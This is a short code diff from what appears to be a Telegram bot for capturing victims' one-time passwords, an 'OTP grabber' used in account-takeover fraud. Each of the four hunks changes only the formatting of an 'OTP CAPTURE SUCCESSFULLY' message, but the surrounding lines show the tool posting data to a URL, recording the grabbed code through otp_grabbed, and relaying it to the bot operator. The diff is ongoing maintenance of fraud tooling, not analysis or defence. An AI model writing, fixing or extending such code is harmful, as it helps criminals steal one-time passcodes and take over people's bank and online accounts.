@@ -1198,7 +1198,7 @@ def custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='HTML')
+            bot.send_message(chatid,f"""<b>OTP CAPTURE SUCCESSFULLY</b> 🐼 <code>{otp2}</code> ✅""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1386,7 +1386,7 @@ def prebuild_script_call(service,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp2)
-            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='HTML')
+            bot.send_message(chatid,f"""<b>OTP CAPTURE SUCCESSFULLY</b> 🐼 <code>{otp2}</code> ✅""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1575,7 +1575,7 @@ def t_custom_prebuild_script_call(script_id,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp=otp2)
-            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='HTML')
+            bot.send_message(chatid,f"""<b>OTP CAPTURE SUCCESSFULLY</b> 🐼 <code>{otp2}</code> ✅""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
@@ -1756,7 +1756,7 @@ def tprebuild_script_call(service,chatid):
 }
             requests.post(url, json=data)
             otp_grabbed(chatid,otp2)
-            bot.send_message(chatid,f"""*OTP CAPTURE SUCCESSFULLY 🐼 <code>{otp2}</code> ✅*""",parse_mode='HTML')
+            bot.send_message(chatid,f"""<b>OTP CAPTURE SUCCESSFULLY</b> 🐼 <code>{otp2}</code> ✅""",parse_mode='HTML')
             keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,resize_keyboard = True)
             keyboard.row_width =2
             keyboard.max_row_keys=2
